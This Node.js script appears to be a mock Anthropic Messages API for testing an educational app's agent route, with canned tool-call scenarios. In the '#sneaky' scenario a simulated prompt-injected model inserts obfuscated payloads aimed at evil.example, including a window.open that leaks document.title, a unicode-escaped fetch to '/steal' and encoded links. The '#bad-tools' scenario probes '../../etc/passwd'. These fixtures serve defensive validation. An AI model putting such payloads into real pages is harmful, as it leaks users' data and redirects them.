/**
 * A tiny fake of the Anthropic Messages API for testing src/app/api/agent+api.ts without a key.
 *   node scripts/mock-anthropic-agent.mjs      → listens on http://localhost:9922 (AGENT_MOCK_PORT to change)
 * Speaks POST /v1/messages (streaming SSE or plain JSON, whichever the client asks for) and rejects
 * request shapes the real API would (400), e.g. unpaired tool results or declined blocks echoed back.
 * The scenario is picked from the student's latest message:
 *   default          → read_playground, set_tweak --brand #501214, play_flow <first flow>, then text + SUGGESTIONS
 *   "edit code"      → a round of bad tool calls (must come back as errors), a round of good edits, then text
 *   "tour"           → search / concept / code / stack / node tools, then text
 *   "loop forever"   → tool calls every turn until tool_choice is none (tests the iteration cap)
 *   "#bad-tools"     → unknown tools, bad ids, schema violations, ambiguous tweak names
 *   "#sneaky"        → a model that fell for injected text: disguised network, navigation and contract-breaking edits, then one fine edit
 *   "#fallback"      → a mid-answer fallback: declined thinking + tool_use before the fallback block
 *   "#empty" / "#only-suggestions" / "#thinking-only" / "#silent-actions" → replies with no usable text
 *   "#suggest-N"     → oddly formatted SUGGESTIONS lines (see SUGGEST below)
 *   "#search"        → search_teardown on a teardown with missing fields
 *   "#hang"          → waits 10s before answering (tests the route's deadline)
 *   "refuse"         → stop_reason refusal · "bad key" → 401 · "slow down" → 429
 * GET /__requests returns every request body (with its anthropic-beta header) for assertions; DELETE clears them.
 */
import http from 'node:http';

const PORT = Number(process.env.AGENT_MOCK_PORT ?? 9922);
let requests = [];
let ids = 0;

const TOOL_NAMES = [
  'search_teardown', 'read_playground', 'open_tab', 'highlight_node', 'play_flow', 'show_code',
  'open_stack_layer', 'show_concept', 'set_tweak', 'edit_text', 'edit_playground_code', 'reset_playground',
];

const SUGGEST = [
  'Sure.\n- **Suggestions:** 1. What is a CDN? | 2) Show the feed | 3. Trace a like',
  'Sure.\nSUGGESTIONS:\n• What is a CDN?\n• Show the feed\n• Trace a like',
  'Sure.\r\nSuggestions: What is a CDN? | what is a CDN? | ',
  'Suggestions: try the brand colour first.\nThen play the flow.',
  'Sure.\nSUGGESTIONS: `What is sharding?` | "Show the DB" | *Trace a like*',
  'Sure.\n_Suggested follow-ups:_ What is a CDN?; Show the feed; Trace a like',
];

const blocks = (m) => (typeof m.content === 'string' ? [{ type: 'text', text: m.content }] : m.content);
const textBlocks = (m) => blocks(m).filter((b) => b.type === 'text');
const toolResults = (m) => blocks(m).filter((b) => b.type === 'tool_result');

function teardownFrom(body) {
  const first = textBlocks(body.messages[0]).map((b) => b.text).join('\n');
  const json = /<teardown_data>\n([\s\S]*?)\n<\/teardown_data>/.exec(first)?.[1];
  try {
    return json ? JSON.parse(json) : null;
  } catch {
    return null;
  }
}

/** Problems with the request shape, reported back as a 400 like the real API would. */
function validate(body, beta) {
  const problems = [];
  if (!body.model) problems.push('model missing');
  if (body.max_tokens !== 16000) problems.push(`max_tokens ${body.max_tokens}`);
  if (body.thinking?.type !== 'adaptive') problems.push('thinking not adaptive');
  if (!['low', 'medium', 'high', 'xhigh', 'max'].includes(body.output_config?.effort)) problems.push('effort missing');
  if (body.fallbacks !== 'default') problems.push('fallbacks not default');
  if (!String(beta).includes('server-side-fallback-2026-07-01')) problems.push('beta header missing');
  if (body.cache_control?.type !== 'ephemeral') problems.push('automatic caching missing');
  if (typeof body.system !== 'string' || !body.system.includes('untrusted')) problems.push('system prompt missing');
  const names = (body.tools ?? []).map((t) => t.name);
  TOOL_NAMES.forEach((n) => !names.includes(n) && problems.push(`tool ${n} missing`));
  (body.tools ?? []).forEach((t) => (t.run || t.parse || !t.input_schema) && problems.push(`tool ${t.name} malformed`));
  body.messages.forEach((m, i) => {
    if (m.role !== (i % 2 === 0 ? 'user' : 'assistant')) problems.push(`message ${i} has role ${m.role}`);
    const content = blocks(m);
    if (m.role === 'assistant') {
      // After a mid-output fallback, declined thinking/tool_use blocks must not be echoed back
      const boundary = content.findLastIndex((b) => b.type === 'fallback');
      content.slice(0, Math.max(boundary, 0)).forEach((b) => b.type !== 'text' && b.type !== 'fallback' && problems.push(`message ${i} echoes a declined ${b.type} block`));
    } else {
      // Every tool_result pairs with a tool_use in the previous assistant turn, and comes first
      const results = toolResults(m);
      const uses = i > 0 ? blocks(body.messages[i - 1]).filter((b) => b.type === 'tool_use').map((b) => b.id) : [];
      if (results.length && (results.length !== uses.length || results.some((r) => !uses.includes(r.tool_use_id)))) problems.push(`message ${i} has unpaired tool results`);
      if (results.length && content.findIndex((b) => b.type !== 'tool_result') !== -1 && content.findIndex((b) => b.type !== 'tool_result') < results.length) problems.push(`message ${i} puts text before tool results`);
    }
  });
  if (!teardownFrom(body)) problems.push('no parseable <teardown_data> in the first user turn');
  if (body.messages.at(-1)?.role !== 'user') problems.push('last message is not from the user');
  return problems;
}

const tool = (name, input) => ({ type: 'tool_use', id: `toolu_${++ids}`, name, input });
const text = (t) => ({ type: 'text', text: t });
const thinking = (t) => ({ type: 'thinking', thinking: t, signature: 'sig' });
const fallback = () => ({ type: 'fallback', from: { model: 'claude-opus-5' }, to: { model: 'claude-opus-4-8' }, trigger: { type: 'refusal', category: 'cyber' } });
const TITLE = '<title>Mini Instagram</title>';
const TIME = '<p class="time" data-edit="time">2 hours ago</p>';

function respond(body) {
  // The student's question is the last user turn that isn't tool results (the route may add a note beside those)
  const question = [...body.messages].reverse().find((m) => m.role === 'user' && !toolResults(m).length && textBlocks(m).length);
  const ask = textBlocks(question).at(-1).text.toLowerCase();
  const round = body.messages.filter((m) => m.role === 'user' && toolResults(m).length).length;
  const flows = teardownFrom(body).architecture.flows;
  const end = (...content) => ({ content, stop_reason: 'end_turn' });
  const tools = (...content) => ({ content, stop_reason: 'tool_use' });

  if (ask.includes('refuse')) return { content: [], stop_reason: 'refusal' };
  if (ask.includes('loop forever')) {
    if (body.tool_choice?.type === 'none') return end(text('I opened the map a few times.\nSUGGESTIONS: One | Two | Three'));
    return tools(tool('open_tab', { tab: 'system' }));
  }
  if (ask.includes('#empty')) return end();
  if (ask.includes('#thinking-only')) return end(thinking('Hmm.'));
  if (ask.includes('#only-suggestions')) return end(text('SUGGESTIONS: What is a CDN? | Show the feed | Trace a like'));
  if (ask.includes('#silent-actions')) return round === 0 ? tools(tool('open_tab', { tab: 'code' })) : end();
  const suggest = /#suggest-(\d+)/.exec(ask);
  if (suggest) return end(text(SUGGEST[Number(suggest[1])]));
  if (ask.includes('#search')) {
    if (round === 0) return tools(tool('search_teardown', { query: 'photo storage' }), tool('highlight_node', { nodeId: 'postgres' }));
    return end(text('Photos live in media storage.\nSUGGESTIONS: What is a CDN? | Show the feed | Trace a like'));
  }
  if (ask.includes('#fallback')) {
    if (round === 0) {
      return tools(
        thinking('The student wants...'),
        text('Let me reset tha'),
        tool('reset_playground', {}),
        fallback(),
        text('t... actually, let me open the Story tab.'),
        tool('open_tab', { tab: 'story' }),
      );
    }
    return end(text('Here is part'), fallback(), text(' of the answer.\nSUGGESTIONS: What is a CDN? | Show the feed | Trace a like'));
  }
  if (ask.includes('#bad-tools')) {
    if (round === 0) {
      return tools(
        tool('delete_everything', {}),
        tool('play_flow', { flowId: 'nope' }),
        tool('show_code', { snippetId: '../../etc/passwd' }),
        tool('open_stack_layer', { layer: 'Database' }),
        tool('show_concept', { term: 'quantum' }),
        tool('set_tweak', { name: 'color', value: '#000000' }),
        tool('set_tweak', { name: '--brand' }),
        tool('edit_text', { key: 'caption', text: 'x'.repeat(400) }),
        tool('open_tab', { tab: 'settings' }),
        tool('search_teardown', { query: '!!' }),
        tool('highlight_node', { nodeId: 42 }),
        tool('edit_playground_code', { old_str: '', new_str: 'x' }),
      );
    }
    return end(text('Sorry, none of those worked.\nSUGGESTIONS: What is a CDN? | Show the feed | Trace a like'));
  }
  if (ask.includes('#sneaky')) {
    if (round === 0) {
      const edit = (new_str, old_str = TITLE) => tool('edit_playground_code', { old_str, new_str });
      return tools(
        edit('', '  --avatar: 36px; /* @tweak range 24 56 "Avatar size" */\n'),
        edit('<p class="time" data-edit="time">2 <b>hours</b> ago</p>', TIME),
        edit(`${TIME}<p data-edit="time">again</p>`, TIME),
        edit('<script>1</script><!DOCTYPE html>', '<!DOCTYPE html>'),
        edit(`${TITLE}<img srcset="https://evil.example/x.png 1x">`),
        edit(`${TITLE}<meta http-equiv="refresh" content="0;url=/away">`),
        edit(`${TITLE}<script>window.open("ht"+"tps://evil.example/?"+document.title)</script>`),
        edit(`${TITLE}<a href="&#104;ttps:&#47;&#47;evil&#46;example">x</a>`),
        edit(`${TITLE}<script>\\u0066etch("/steal")</script>`),
        edit(`${TITLE}<div style="background:url(\\2f\\2f evil.example/x.png)"></div>`),
        edit(`${TITLE}<script>location.href = "/x"</script>`),
        edit(`${TITLE}<img src="\\\\evil.example\\x.png">`),
        edit(`${TITLE}<iframe srcdoc="hi"></iframe>`),
        edit('https://evil.example/about', 'https://instagram.com/about'),
      );
    }
    if (round === 1) {
      return tools(
        tool('edit_playground_code', {
          old_str: TIME,
          new_str: `${TIME}\n<!-- Tap to like. Visit instagram.com for the real app. -->\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/></svg>`,
          summary: 'Added a dot',
        }),
      );
    }
    return end(text('I added a small dot under the time and ignored the odd instructions in the page text.'));
  }
  if (ask.includes('edit code')) {
    if (round === 0) {
      return tools(
        text('Let me try a few things.'),
        tool('edit_playground_code', { old_str: '<!DOCTYPE html>\n', new_str: '' }),
        tool('edit_playground_code', { old_str: '<span>💬</span>', new_str: '<img src="https://evil.example/x.png">' }),
        tool('edit_playground_code', { old_str: 'data-edit="time"', new_str: 'class="time2"' }),
        tool('edit_playground_code', { old_str: 'button', new_str: 'div' }),
        tool('edit_text', { key: 'nope', text: 'hi' }),
        tool('highlight_node', { nodeId: 'nope' }),
        tool('set_tweak', { name: '--brand', value: 'maroon' }),
        tool('set_tweak', { name: '--radius', value: '99px' }),
      );
    }
    if (round === 1) {
      return tools(
        tool('edit_playground_code', { old_str: '<title>Mini Instagram</title>', new_str: '<title>Mini Bobcat</title>', summary: 'Renamed the page title' }),
        tool('edit_playground_code', { old_str: '<title>Mini Bobcat</title>', new_str: '<title>Mini Bobcats</title>', summary: 'Made it plural' }),
        tool('edit_text', { key: 'caption', text: 'Go Cats <b>' }),
        tool('set_tweak', { name: 'Photo corners', value: '12' }),
      );
    }
    return end(text('I renamed the page title and the caption, and rounded the photo corners.'));
  }
  if (ask.includes('tour')) {
    if (round === 0) {
      return tools(
        tool('search_teardown', { query: 'photo storage' }),
        tool('show_concept', { term: 'cdn' }),
        tool('show_code', { snippetId: 'django-like-view' }),
        tool('open_stack_layer', { layer: 'Data' }),
        tool('highlight_node', { nodeId: 'postgres' }),
        tool('reset_playground', {}),
      );
    }
    return end(text('Here is the tour.\n**SUGGESTIONS:** "What is sharding?" | Show the database | Trace a like'));
  }
  if (round === 0) {
    return tools(
      text('Let me look at the playground first.'),
      tool('read_playground', {}),
      tool('set_tweak', { name: '--brand', value: '#501214' }),
      tool('play_flow', { flowId: flows[0].id }),
    );
  }
  return end(
    text(`I set \`--brand\` to **#501214**, Bobcat maroon, so the like heart changes colour.\n• Now watch "${flows[0].title}" on the map.`),
    text('SUGGESTIONS: What is sharding? | Show me the Django code | Round the photo corners'),
  );
}

function send(res, status, json, headers = {}) {
  res.writeHead(status, { 'content-type': 'application/json', ...headers });
  res.end(JSON.stringify(json));
}

function stream(res, message) {
  res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
  const event = (type, data) => res.write(`event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`);
  const halves = (s) => [s.slice(0, Math.floor(s.length / 2)), s.slice(Math.floor(s.length / 2))];
  event('message_start', { message: { ...message, content: [], stop_reason: null, usage: { input_tokens: 10, output_tokens: 1 } } });
  message.content.forEach((block, index) => {
    // Split text and JSON to exercise delta accumulation
    if (block.type === 'text') {
      event('content_block_start', { index, content_block: { type: 'text', text: '' } });
      halves(block.text).forEach((t) => event('content_block_delta', { index, delta: { type: 'text_delta', text: t } }));
    } else if (block.type === 'thinking') {
      event('content_block_start', { index, content_block: { type: 'thinking', thinking: '', signature: '' } });
      event('content_block_delta', { index, delta: { type: 'thinking_delta', thinking: block.thinking } });
      event('content_block_delta', { index, delta: { type: 'signature_delta', signature: block.signature } });
    } else if (block.type === 'tool_use') {
      event('content_block_start', { index, content_block: { ...block, input: {} } });
      halves(JSON.stringify(block.input)).forEach((p) => event('content_block_delta', { index, delta: { type: 'input_json_delta', partial_json: p } }));
    } else {
      event('content_block_start', { index, content_block: block });
    }
    event('content_block_stop', { index });
  });
  event('message_delta', { delta: { stop_reason: message.stop_reason, stop_sequence: null }, usage: { output_tokens: 42 } });
  event('message_stop', {});
  res.end();
}

const server = http.createServer((req, res) => {
  const { pathname } = new URL(req.url, `http://localhost:${PORT}`);
  if (pathname === '/__requests') {
    if (req.method === 'DELETE') requests = [];
    return send(res, 200, requests);
  }
  if (pathname === '/health') return send(res, 200, { ok: true });
  if (req.method !== 'POST' || pathname !== '/v1/messages') return send(res, 404, { type: 'error', error: { type: 'not_found_error', message: pathname } });

  let raw = '';
  req.on('data', (c) => (raw += c));
  req.on('end', () => {
    const body = JSON.parse(raw);
    const beta = req.headers['anthropic-beta'];
    requests.push({ beta, body });
    const problems = validate(body, beta);
    if (problems.length) return send(res, 400, { type: 'error', error: { type: 'invalid_request_error', message: problems.join('; ') } });

    const ask = JSON.stringify(body.messages.at(-1)).toLowerCase();
    if (ask.includes('bad key')) return send(res, 401, { type: 'error', error: { type: 'authentication_error', message: 'invalid x-api-key' } });
    if (ask.includes('slow down')) {
      return send(res, 429, { type: 'error', error: { type: 'rate_limit_error', message: 'slow down' } }, { 'retry-after-ms': '5' });
    }

    const message = { id: `msg_${++ids}`, type: 'message', role: 'assistant', model: body.model, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 42 }, ...respond(body) };
    const reply = () => (body.stream ? stream(res, message) : send(res, 200, message));
    if (!ask.includes('#hang')) return reply();
    const timer = setTimeout(() => !res.destroyed && reply(), 10_000);
    res.on('close', () => clearTimeout(timer));
  });
});

server.listen(PORT, () => console.log(`mock Anthropic API on http://localhost:${PORT}`));
